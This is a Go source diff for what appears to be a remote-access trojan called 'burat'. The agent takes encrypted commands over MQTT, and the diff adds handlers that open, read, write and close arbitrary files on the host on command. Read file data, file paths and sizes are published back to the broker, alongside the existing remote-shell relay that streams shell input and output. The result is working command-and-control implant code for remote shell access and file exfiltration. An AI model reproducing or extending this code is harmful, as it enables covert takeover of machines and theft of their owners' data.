@@ -77,23 +77,27 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 	})
 
 	burat.AddTopicCallback("filerw_cmd_open", func (client mqtt.Client, message mqtt.Message) {
-		fmt.Println(message.Payload())
-		//packet := burat.Decryse(message.Payload)
+		var packet packets.FilerwOpenPacket
+		burat.Decryse(message.Payload(), &packet)
+		burat.Bushido().FileRW.Open(packet.Id, packet.Path, packet.Mode, packet.Size)
 	})
 
 	burat.AddTopicCallback("filerw_cmd_close", func (client mqtt.Client, message mqtt.Message) {
-		fmt.Println(message.Payload())
-		//packet := burat.Decryse(message.Payload)
+		var packet packets.FilerwClosePacket
+		burat.Decryse(message.Payload(), &packet)
+		burat.Bushido().FileRW.Close(packet.Id)
 	})
 
 	burat.AddTopicCallback("filerw_cmd_read", func (client mqtt.Client, message mqtt.Message) {
-		fmt.Println(message.Payload())
-		//packet := burat.Decryse(message.Payload)
+		var packet packets.FilerwReadPacket
+		burat.Decryse(message.Payload(), &packet)
+		burat.Bushido().FileRW.Read(packet.Id, packet.Length)
 	})
 
 	burat.AddTopicCallback("filerw_cmd_write", func (client mqtt.Client, message mqtt.Message) {
-		fmt.Println(message.Payload())
-		//packet := burat.Decryse(message.Payload)
+		var packet packets.FilerwWritePacket
+		burat.Decryse(message.Payload(), &packet)
+		burat.Bushido().FileRW.Write(packet.Id, packet.Data)
 	})
 
 	burat.Bushido().RemoteShell.OnOpen(func (id string) {
@@ -101,7 +105,7 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 		remoteshells := burat.Bushido().RemoteShell.RemoteShells()
 		for _, rs := range remoteshells {
 			if rs.Id() == id {
-				packet := burat.Seen(packets.RemoteShellOnOpenPacket{ Id: id, Shell: rs.Shell() })
+				packet := burat.Seen(packets.RemoteShellOnOpenPacket { Id: id, Shell: rs.Shell() })
 				burat.Publish(id, "remoteshell", 2, true, packet)
 			}
 		}
@@ -114,14 +118,82 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 
 	burat.Bushido().RemoteShell.OnRead(func (id string, data string) {
 		fmt.Println("remoteshell.read", id, data)
-		packet := burat.Seen(packets.RemoteShellOnReadPacket{ Id: id, Data: data })
+		packet := burat.Seen(packets.RemoteShellOnReadPacket { Id: id, Data: data })
 		burat.Publish(id, "remoteshell_evt_read", 2, false, packet)
 	})
 
 	burat.Bushido().RemoteShell.OnWrite(func (id string, data string) {
 		fmt.Println("remoteshell.write", id, data)
-		packet := burat.Seen(packets.RemoteShellOnWritePacket{ Id: id, Data: data })
+		packet := burat.Seen(packets.RemoteShellOnWritePacket { Id: id, Data: data })
 		burat.Publish(id, "remoteshell_evt_write", 2, false, packet)
+	})
+
+	burat.Bushido().FileRW.OnOpen(func (id string) {
+		fmt.Println("filerw.open", id)
+		files := burat.Bushido().FileRW.Files()
+		for _, f := range files {
+			if f.Id() == id {
+				packet := burat.Seen(packets.FilerwOnOpenPacket {
+					Id: id,
+					Path: f.Path() ,
+					Mode: f.Mode(),
+					Size: f.Size(),
+					BytesIO: f.BytesIO(),
+				})
+				burat.Publish(id, "filerw", 2, true, packet)
+			}
+		}
+	})
+
+	burat.Bushido().FileRW.OnClose(func (id string) {
+		fmt.Println("filerw.close", id)
+		burat.Publish(id, "filerw", 2, true, nil)
+	})
+
+	burat.Bushido().FileRW.OnRead(func (id string, data []byte) {
+		fmt.Println("filerw.read", id, data)
+		packet := burat.Seen(packets.FilerwOnReadPacket { Id: id, Data: data })
+		burat.Publish(id, "filerw_evt_read", 2, false, packet)
+
+		files := burat.Bushido().FileRW.Files()
+		for _, f := range files {
+			if f.Id() == id {
+				packet := burat.Seen(packets.FilerwOnOpenPacket {
+					Id: id,
+					Path: f.Path() ,
+					Mode: f.Mode(),
+					Size: f.Size(),
+					BytesIO: f.BytesIO(),
+				})
+				burat.Publish(id, "filerw", 2, true, packet)
+			}
+		}
+	})
+
+	burat.Bushido().FileRW.OnWrite(func (id string, length int) {
+		fmt.Println("filerw.write", id, length)
+		packet := burat.Seen(packets.FilerwOnWritePacket { Id: id, Length: length })
+		burat.Publish(id, "filerw_evt_write", 2, false, packet)
+
+		files := burat.Bushido().FileRW.Files()
+		for _, f := range files {
+			if f.Id() == id {
+				packet := burat.Seen(packets.FilerwOnOpenPacket {
+					Id: id,
+					Path: f.Path() ,
+					Mode: f.Mode(),
+					Size: f.Size(),
+					BytesIO: f.BytesIO(),
+				})
+				burat.Publish(id, "filerw", 2, true, packet)
+			}
+		}
+	})
+
+	burat.Bushido().FileRW.OnError(func (id string, error string) {
+		fmt.Println("filerw.error", id, error)
+		packet := burat.Seen(packets.FilerwOnErrorPacket { Id: id, Error: error })
+		burat.Publish(id, "filerw_evt_error", 2, false, packet)
 	})
 
 	for {
